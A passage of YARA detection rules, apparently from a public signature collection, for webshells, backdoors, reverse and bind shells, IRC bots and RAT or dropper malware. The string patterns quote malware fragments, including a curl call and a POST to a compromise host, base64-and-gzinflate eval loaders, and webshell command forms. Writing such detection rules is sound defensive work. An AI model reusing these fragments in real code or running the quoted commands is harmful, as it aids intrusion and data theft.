		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/gen_github_repo_compromise_myjino_ru.yar#L2-L15"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		logic_hash = "5cbe6ee46a68d89b1e772762e29baa907458235cd014f20a0d0932e95c046f19"
		score = 90
		quality = 85
		tags = ""

	strings:
		$x1 = "curl http://ovz1.j19544519.pr46m.vps.myjino.ru" ascii wide
		$x2 = "http__.Post(\"http://ovz1.j19544519.pr46m.vps.myjino.ru" ascii wide

	condition:
		1 of them
}

rule SIGNATURE_BASE_MAL_JS_Efile_Apr23_1_2
{
	meta:
		description = "Detects JavaScript malware used in eFile compromise"
		author = "Florian Roth"
		id = "ba7a8b2c-789c-5bc5-be53-f2b92c7039e1"
		date = "2023-04-06"
		modified = "2023-12-05"
		reference = "https://twitter.com/Ax_Sharma/status/1643178696084271104/photo/1"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/mal_efile_apr23.yar#L2-L15"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		logic_hash = "6d94162e5719b92d9df349e7d48cd70e218998b0e120870a435a8073fa49c532"
		score = 75
		quality = 85
		tags = ""

	strings:
		$s1 = "let payload_chrome = "
		$s2 = "else if (agent.indexOf(\"firefox"

	condition:
		all of them
}

rule SIGNATURE_BASE_MAL_PHP_Efile_Apr23_1_2
{
	meta:
		description = "Detects malware "
		author = "Florian Roth"
		id = "d663b38e-b082-5cf7-9853-f4685bf3a87b"
		date = "2023-04-06"
		modified = "2023-12-05"
		reference = "https://twitter.com/malwrhunterteam/status/1642988428080865281?s=12&t=C0_T_re0wRP_NfKa27Xw9w"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/mal_efile_apr23.yar#L18-L32"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		logic_hash = "ec4ac3f5c19f506a70eacb5fe3173cc06bf20567bbc9a96f3b269910382e5fa2"
		score = 75
		quality = 85
		tags = ""

	strings:
		$s1 = "mt_rand( 0, 0xffff ), mt_rand( 0, 0xffff )" ascii
		$s2 = "C:\\\\ProgramData\\\\Browsers" ascii fullword
		$s3 = "curl_https($api_url." ascii

	condition:
		all of them
}

rule SIGNATURE_BASE_KINS_Dropper_2
{
	meta:
		description = "Match protocol, process injects and windows exploit present in KINS dropper"
		author = "AlienVault Labs aortega@alienvault.com"
		id = "17e12685-aaad-5d83-949c-43d5aef1ef0d"
		date = "2023-12-05"
		modified = "2023-12-05"
		reference = "http://goo.gl/arPhm3"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/crime_kins_dropper.yar#L1-L26"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		logic_hash = "cdab93f823e13e0c3104de8e05cb1572f83fb5294f359698092d73fc7983955b"
		score = 75
		quality = 85
		tags = ""

	strings:
		$n1 = "tid=%d&ta=%s-%x" fullword
		$n2 = "fid=%d" fullword
		$n3 = "%[^.].%[^(](%[^)])" fullword
		$i0 = "%s [%s %d] 77 %s"
		$i01 = "Global\\%s%x"
		$i1 = "Inject::InjectProcessByName()"
		$i2 = "Inject::CopyImageToProcess()"
		$i3 = "Inject::InjectProcess()"
		$i4 = "Inject::InjectImageToProcess()"
		$i5 = "Drop::InjectStartThread()"
		$uac1 = "ExploitMS10_092"
		$uac2 = "\\globalroot\\systemroot\\system32\\tasks\\" ascii wide
		$uac3 = "<RunLevel>HighestAvailable</RunLevel>" ascii wide

	condition:
		2 of ( $n* ) and 2 of ( $i* ) and 2 of ( $uac* )
}

rule SIGNATURE_BASE_MAL_Grace_Dec22_2
{
	meta:
		description = "Detects Grace (aka FlawedGrace and GraceWire) RAT"
		author = "X__Junior"
		id = "fc2214dc-f1e5-52d7-a9de-88709a03b04e"
		date = "2022-12-13"
		modified = "2023-12-05"
		reference = "https://blog.talosintelligence.com/breaking-the-silence-recent-truebot-activity/"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/expl_sysaid_cve_2023_47246.yar#L40-L59"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		logic_hash = "8276662dadfa2f8e07dd7882a60e55bd22ecf1f8f66a09940f16236598646560"
		score = 70
		quality = 85
		tags = ""
		hash1 = "a66df3454b8c13f1b92d8b2cf74f5bfcdedfbff41a5e4add62e15277d14dd169"
		hash2 = "e113a8df3c4845365f924bacf10c00bcc5e17587a204b640852dafca6db20404"

	strings:
		$sa1 = "Grace finalized, no more library calls allowed." ascii
		$sa2 = "Socket forcibly closed due to no response to DISCONNECT signal from other side, worker id(%d)" ascii
		$sa3 = "AVWireCleanupThread" ascii
		$sa4 = "AVTunnelClientDirectIO" ascii
		$sa5 = "AVGraceTunnelWriteThread" ascii
		$sa6 = "AVGraceTunnelClientDirectIO" ascii

	condition:
		2 of them
}

rule SIGNATURE_BASE_Perlbot_Pl_2
{
	meta:
		description = "Semi-Auto-generated  - file perlbot.pl.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		id = "378cb0e4-2069-50b7-ab3e-5a81055e9983"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L3635-L3646"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "7e4deb9884ffffa5d82c22f8dc533a45"
		logic_hash = "784980d620e71fb0cf5aed9ef8bd171a8f50d850bc782645575070b75c42e426"
		score = 75
		quality = 85
		tags = ""

	strings:
		$s0 = "my @adms=(\"Kelserific\",\"Puna\",\"nod32\")"
		$s1 = "#Acesso a Shel - 1 ON 0 OFF"

	condition:
		1 of them
}

rule SIGNATURE_BASE_Php_Backdoor_Php_2
{
	meta:
		description = "Semi-Auto-generated  - file php-backdoor.php.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		id = "aca53071-f793-538d-bbeb-34469cdb4d1f"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L3647-L3659"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "2b5cb105c4ea9b5ebc64705b4bd86bf7"
		logic_hash = "acab82b40760b45d49da51953f78c69166955de54918634c9bfe394208cdbb56"
		score = 75
		quality = 85
		tags = ""

	strings:
		$s0 = "http://michaeldaw.org   2006"
		$s1 = "or http://<? echo $SERVER_NAME.$REQUEST_URI; ?>?d=c:/windows on win"
		$s3 = "coded by z0mbie"

	condition:
		1 of them
}

rule SIGNATURE_BASE_Liz0Zim_Private_Safe_Mode_Command_Execuriton_Bypass_Exploit_Php_2
{
	meta:
		description = "Semi-Auto-generated  - file Liz0ziM Private Safe Mode Command Execuriton Bypass Exploit.php.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		id = "e91114ce-18f9-51cd-b41c-b796960ea4fe"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L3660-L3672"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "c6eeacbe779518ea78b8f7ed5f63fc11"
		logic_hash = "a0606dad4474579354709fe6306d15427afc4dec8ad6760a0ee9e91c86c23e4d"
		score = 75
		quality = 85
		tags = ""

	strings:
		$s0 = "<option value=\"cat /var/cpanel/accounting.log\">/var/cpanel/accounting.log</opt"
		$s1 = "Liz0ziM Private Safe Mode Command Execuriton Bypass"
		$s2 = "echo \"<b><font color=red>Kimim Ben :=)</font></b>:$uid<br>\";" fullword

	condition:
		1 of them
}

rule SIGNATURE_BASE_Nshell__1__Php_Php_2
{
	meta:
		description = "Semi-Auto-generated  - file Nshell (1).php.php.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		id = "44e8b6c5-6f41-5c37-a083-26acedd91956"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L3673-L3684"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "973fc89694097a41e684b43a21b1b099"
		logic_hash = "53c7cd24c4eddbded1b4c16fd2758bdf66c0bbe396e487a56d56fc053cf3cc1a"
		score = 75
		quality = 85
		tags = ""

	strings:
		$s0 = "echo \"Command : <INPUT TYPE=text NAME=cmd value=\".@stripslashes(htmlentities($"
		$s1 = "if(!$whoami)$whoami=exec(\"whoami\"); echo \"whoami :\".$whoami.\"<br>\";" fullword

	condition:
		1 of them
}

rule SIGNATURE_BASE_Shankar_Php_Php_2
{
	meta:
		description = "Semi-Auto-generated  - file shankar.php.php.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		id = "0c8ab3eb-574b-5e5a-8117-4efecef94f83"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L3685-L3697"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "6eb9db6a3974e511b7951b8f7e7136bb"
		logic_hash = "58b365206c18b8394cf1e03b71b8e47be10bc933bc2c05b7b03b7dad94f6d6b8"
		score = 75
		quality = 85
		tags = ""

	strings:
		$sAuthor = "ShAnKaR"
		$s0 = "<input type=checkbox name='dd' \".(isset($_POST['dd'])?'checked':'').\">DB<input"
		$s3 = "Show<input type=text size=5 value=\".((isset($_POST['br_st']) && isset($_POST['b"

	condition:
		1 of ( $s* ) and $sAuthor
}

rule SIGNATURE_BASE_Casus15_Php_Php_2
{
	meta:
		description = "Semi-Auto-generated  - file Casus15.php.php.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		id = "ba6748a2-fb80-5eda-816c-155bab9285e5"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L3698-L3710"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "5e2ede2d1c4fa1fcc3cbfe0c005d7b13"
		logic_hash = "6ee7a07163d33ca329d3be2084406629711db14db4605e8413ee963eb0f9d5a7"
		score = 75
		quality = 85
		tags = ""

	strings:
		$s0 = "copy ( $dosya_gonder2, \"$dir/$dosya_gonder2_name\") ? print(\"$dosya_gonder2_na"
		$s2 = "echo \"<center><font size='$sayi' color='#FFFFFF'>HACKLERIN<font color='#008000'"
		$s3 = "value='Calistirmak istediginiz "

	condition:
		1 of them
}

rule SIGNATURE_BASE_Small_Php_Php_2
{
	meta:
		description = "Semi-Auto-generated  - file small.php.php.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		id = "cf4fb88f-a312-560d-be0b-b55bfcb889be"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L3711-L3723"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "fcee6226d09d150bfa5f103bee61fbde"
		logic_hash = "e0444aa604e8956d423037b70b9476f5653503055d0f1bc875d43de144ce5c44"
		score = 75
		quality = 85
		tags = ""

	strings:
		$s1 = "$pass='abcdef1234567890abcdef1234567890';" fullword
		$s2 = "eval(gzinflate(base64_decode('FJzHkqPatkU/550IGnjXxHvv6bzAe0iE5+svFVGtKqXMZq05x1"
		$s4 = "@ini_set('error_log',NULL);" fullword

	condition:
		2 of them
}

rule SIGNATURE_BASE_Shellbot_Pl_2
{
	meta:
		description = "Semi-Auto-generated  - file shellbot.pl.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		id = "07c145b1-c9f7-564a-b354-a6d2072f380c"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L3724-L3738"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "b2a883bc3c03a35cfd020dd2ace4bab8"
		logic_hash = "5db224e4fe8608bb53f044ca6c0361dc66cadd58c6d4ea5ab4f8ae14ebde0e6e"
		score = 75
		quality = 85
		tags = ""

	strings:
		$s0 = "ShellBOT"
		$s1 = "PacktsGr0up"
		$s2 = "CoRpOrAtIoN"
		$s3 = "# Servidor de irc que vai ser usado "
		$s4 = "/^ctcpflood\\s+(\\d+)\\s+(\\S+)"

	condition:
		2 of them
}

rule SIGNATURE_BASE_Ngh_Php_Php_2
{
	meta:
		description = "Semi-Auto-generated  - file ngh.php.php.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		id = "2d8ff3c1-d6b3-57ce-8213-232b376dbd05"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L3753-L3767"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "c372b725419cdfd3f8a6371cfeebc2fd"
		logic_hash = "c794b216bafdaecf5bd138cc8c7552efbb8c3c571a441489d02a19793a4c294f"
		score = 75
		quality = 85
		tags = ""

	strings:
		$s0 = "Cr4sh_aka_RKL"
		$s1 = "NGH edition"
		$s2 = "/* connectback-backdoor on perl"
		$s3 = "<form action=<?=$script?>?act=bindshell method=POST>"
		$s4 = "$logo = \"R0lGODlhMAAwAOYAAAAAAP////r"

	condition:
		1 of them
}

rule SIGNATURE_BASE_Jsp_Reverse_Jsp_2
{
	meta:
		description = "Semi-Auto-generated  - file jsp-reverse.jsp.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		id = "4953b230-4cd9-55d6-a3cb-8d3713e7fb0c"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L3768-L3780"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "8b0e6779f25a17f0ffb3df14122ba594"
		logic_hash = "bdd2db4c032b25faaaf3a3a8e769000013f643ecfcb8b0374165a244ad2162a6"
		score = 75
		quality = 85
		tags = ""

	strings:
		$s0 = "// backdoor.jsp"
		$s1 = "JSP Backdoor Reverse Shell"
		$s2 = "http://michaeldaw.org"

	condition:
		2 of them
}

rule SIGNATURE_BASE_Tool_Asp_2
{
	meta:
		description = "Semi-Auto-generated  - file Tool.asp.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		id = "e5e727bd-836b-5540-8755-40f37904bc03"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L3781-L3794"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "8febea6ca6051ae5e2ad4c78f4b9c1f2"
		logic_hash = "d6bd782302b2c614fc572babb3825c0e1fcd0de5841ca8541ca27580ccc274d4"
		score = 75
		quality = 85
		tags = ""

	strings:
		$s0 = "mailto:rhfactor@antisocial.com"
		$s2 = "?raiz=root"
		$s3 = "DIGO CORROMPIDO<BR>CORRUPT CODE"
		$s4 = "key = \"5DCADAC1902E59F7273E1902E5AD8414B1902E5ABF3E661902E5B554FC41902E53205CA0"

	condition:
		2 of them
}

rule SIGNATURE_BASE_NT_Addy_Asp_2
{
	meta:
		description = "Semi-Auto-generated  - file NT Addy.asp.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		id = "18f5f360-8690-5e09-ac18-b8cc4f678811"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L3795-L3807"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "2e0d1bae844c9a8e6e351297d77a1fec"
		logic_hash = "0fc61d5e276786b8be822712cdcfc81146998e535532e44d3da92e0668713a48"
		score = 75
		quality = 85
		tags = ""

	strings:
		$s0 = "NTDaddy v1.9 by obzerve of fux0r inc"
		$s2 = "<ERROR: THIS IS NOT A TEXT FILE>"
		$s4 = "RAW D.O.S. COMMAND INTERFACE"

	condition:
		1 of them
}

rule SIGNATURE_BASE_Simattacker___Vrsion_1_0_0___Priv8_4_My_Friend_Php_2
{
	meta:
		description = "Semi-Auto-generated  - file SimAttacker - Vrsion 1.0.0 - priv8 4 My friend.php.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		id = "8a34f4fd-337d-5eb4-b7b7-4adb1c2b7937"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L3808-L3820"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "089ff24d978aeff2b4b2869f0c7d38a3"
		logic_hash = "46bc4063d06b4af3e4e61e1e998d489e974e76f17363c9777b8afc39ff21f698"
		score = 75
		quality = 85
		tags = ""

	strings:
		$s0 = "SimAttacker - Vrsion : 1.0.0 - priv8 4 My friend"
		$s3 = " fputs ($fp ,\"\\n*********************************************\\nWelcome T0 Sim"
		$s4 = "echo \"<a target='_blank' href='?id=fm&fedit=$dir$file'><span style='text-decora"

	condition:
		1 of them
}

rule SIGNATURE_BASE_Remexp_Asp_2
{
	meta:
		description = "Semi-Auto-generated  - file RemExp.asp.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		id = "900036ce-ff13-5441-bb77-906ea08a4ca0"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L3821-L3833"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "aa1d8491f4e2894dbdb91eec1abc2244"
		logic_hash = "c7da9908a0252e95b47dbc8fbb36aeac1661dc464123aaca036bd51047a31584"
		score = 75
		quality = 85
		tags = ""

	strings:
		$s0 = "<title>Remote Explorer</title>"
		$s3 = " FSO.CopyFile Request.QueryString(\"FolderPath\") & Request.QueryString(\"CopyFi"
		$s4 = "<td bgcolor=\"<%=BgColor%>\" title=\"<%=File.Name%>\"> <a href= \"showcode.asp?f"

	condition:
		2 of them
}

rule SIGNATURE_BASE_Phvayvv_Php_Php_2
{
	meta:
		description = "Semi-Auto-generated  - file phvayvv.php.php.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		id = "76351a59-8f52-5110-a9b8-36edd59026df"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L3834-L3846"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "35fb37f3c806718545d97c6559abd262"
		logic_hash = "503a69a7e2c30cc82eba430082627bb93c459a95f675b968126bf4524c598863"
		score = 75
		quality = 85
		tags = ""

	strings:
		$s0 = "{mkdir(\"$dizin/$duzenx2\",777)"
		$s1 = "$baglan=fopen($duzkaydet,'w');"
		$s2 = "PHVayv 1.0"

	condition:
		1 of them
}

rule SIGNATURE_BASE_Klasvayv_Asp_2
{
	meta:
		description = "Semi-Auto-generated  - file klasvayv.asp.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		id = "3ca4c20c-f879-55a0-9070-d40fc903f9ae"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L3847-L3860"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "2b3e64bf8462fc3d008a3d1012da64ef"
		logic_hash = "eb1b11e02b075a4e7d28b77cf91ad596a85e4c697a36304ee177d46735965e75"
		score = 75
		quality = 85
		tags = ""

	strings:
		$s1 = "set aktifklas=request.querystring(\"aktifklas\")"
		$s2 = "action=\"klasvayv.asp?klasorac=1&aktifklas=<%=aktifklas%>&klas=<%=aktifklas%>"
		$s3 = "<font color=\"#858585\">www.aventgrup.net"
		$s4 = "style=\"BACKGROUND-COLOR: #95B4CC; BORDER-BOTTOM: #000000 1px inset; BORDER-LEFT"

	condition:
		1 of them
}

rule SIGNATURE_BASE_R57Shell_Php_Php_2
{
	meta:
		description = "Semi-Auto-generated  - file r57shell.php.php.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		id = "1f1070e8-e82c-5cae-a64a-cd5028adae97"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L3861-L3874"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "d28445de424594a5f14d0fe2a7c4e94f"
		logic_hash = "658eec4f3c463ec1a480bcb7ba995b8d81d1fb846832e569751d9f505f0fa87e"
		score = 75
		quality = 85
		tags = ""

	strings:
		$s1 = " else if ($HTTP_POST_VARS['with'] == \"lynx\") { $HTTP_POST_VARS['cmd']= \"lynx "
		$s2 = "RusH security team"
		$s3 = "'ru_text12' => 'back-connect"
		$s4 = "<title>r57shell</title>"

	condition:
		1 of them
}

rule SIGNATURE_BASE_Rst_Sql_Php_Php_2
{
	meta:
		description = "Semi-Auto-generated  - file rst_sql.php.php.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		id = "41730336-0dce-5ed9-95b0-c911a4e3cb48"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L3875-L3888"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "0961641a4ab2b8cb4d2beca593a92010"
		logic_hash = "d15cf69d9ad8683d2ac1ff09b08b0b26ecaf35df8e45bbd5c3a02c393f88cb34"
		score = 75
		quality = 85
		tags = ""

	strings:
		$s0 = "C:\\tmp\\dump_"
		$s1 = "RST MySQL"
		$s2 = "http://rst.void.ru"
		$s3 = "$st_form_bg='R0lGODlhCQAJAIAAAOfo6u7w8yH5BAAAAAAALAAAAAAJAAkAAAIPjAOnuJfNHJh0qtfw0lcVADs=';"

	condition:
		2 of them
}

rule SIGNATURE_BASE_Wh_Bindshell_Py_2
{
	meta:
		description = "Semi-Auto-generated  - file wh_bindshell.py.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		id = "b7acbfe7-fd28-5832-9af2-1c5befe4bbab"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L3889-L3901"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "fab20902862736e24aaae275af5e049c"
		logic_hash = "e38a4f5c23371705f9bbf2db8e65d68074554edc1022576166e76d40e06bc039"
		score = 75
		quality = 85
		tags = ""

	strings:
		$s0 = "#Use: python wh_bindshell.py [port] [password]"
		$s2 = "python -c\"import md5;x=md5.new('you_password');print x.hexdigest()\"" fullword
		$s3 = "#bugz: ctrl+c etc =script stoped=" fullword

	condition:
		1 of them
}

rule SIGNATURE_BASE_C99Madshell_V2_0_Php_Php_2
{
	meta:
		description = "Semi-Auto-generated  - file c99madshell_v2.0.php.php.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		id = "b0724920-dc1e-5819-a99b-618a9a7e1eca"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L3915-L3925"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "d27292895da9afa5b60b9d3014f39294"
		logic_hash = "07922511d9dfdd32f6b1f47479fca2063b773024a20dcab6f5cf4d56d66c3397"
		score = 75
		quality = 85
		tags = ""

	strings:
		$s2 = "eval(gzinflate(base64_decode('HJ3HkqNQEkU/ZzqCBd4t8V4YAQI2E3jvPV8/1Gw6orsVFLyXef"

	condition:
		all of them
}

rule SIGNATURE_BASE_Uploader_Php_Php_2
{
	meta:
		description = "Semi-Auto-generated  - file uploader.php.php.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		id = "62aa783b-f12f-5bb5-9d96-7aee1666788b"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L3938-L3950"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "0b53b67bb3b004a8681e1458dd1895d0"
		logic_hash = "6e6ffc4cad2a956cb2b6667928bac5996cf95cd36f43ba789144c46726471f07"
		score = 75
		quality = 85
		tags = ""

	strings:
		$s2 = "move_uploaded_file($userfile, \"entrika.php\"); " fullword
		$s3 = "Send this file: <INPUT NAME=\"userfile\" TYPE=\"file\">" fullword
		$s4 = "<INPUT TYPE=\"hidden\" name=\"MAX_FILE_SIZE\" value=\"100000\">" fullword

	condition:
		2 of them
}

rule SIGNATURE_BASE_Telnet_Pl_2
{
	meta:
		description = "Semi-Auto-generated  - file telnet.pl.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		id = "be4de017-e929-5dd3-a60e-f187456b1a55"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L3951-L3962"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "dd9dba14383064e219e29396e242c1ec"
		logic_hash = "2d1abc52fc70ce664a19e49e6fa4175bc8d8785dee332d5273323479d9628a8c"
		score = 75
		quality = 85
		tags = ""

	strings:
		$s0 = "W A R N I N G: Private Server"
		$s2 = "$Message = q$<pre><font color=\"#669999\"> _____  _____  _____          _____   "

	condition:
		all of them
}

rule SIGNATURE_BASE_W3D_Php_Php_2
{
	meta:
		description = "Semi-Auto-generated  - file w3d.php.php.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		id = "1a4e3c84-2d3b-5245-bccc-9a5f59b9fc17"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L3963-L3975"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "987f66b29bfb209a0b4f097f84f57c3b"
		logic_hash = "33f948a1ae4474daddd788df84fa8baabf4390ec242cad9a6a51dac0152d3b75"
		score = 75
		quality = 85
		tags = ""

	strings:
